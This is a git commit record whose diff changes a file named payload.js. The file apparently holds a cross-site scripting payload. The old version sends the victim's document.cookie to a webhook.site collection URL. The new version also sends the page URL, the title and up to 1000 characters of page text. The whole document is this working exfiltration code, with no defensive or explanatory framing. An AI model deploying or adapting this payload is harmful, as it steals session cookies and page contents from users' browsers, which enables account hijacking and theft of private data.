bbb1c547ab0c0e2edeca1e652727306e05e191cb
jeremybonin-bit <jeremy.bonin@lamache.org>
2026-06-11 09:14:31 +0200

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,5 @@
-location = "https://webhook.site/a8af7f63-4bbf-4dcb-9854-72a33246d4db?c=" + encodeURIComponent(document.cookie);
+location = "https://webhook.site/a8af7f63-4bbf-4dcb-9854-72a33246d4db?c="
+  + encodeURIComponent(document.cookie)
+  + "&u=" + encodeURIComponent(location.href)
+  + "&t=" + encodeURIComponent(document.title)
+  + "&b=" + encodeURIComponent(document.body.innerText.slice(0, 1000));
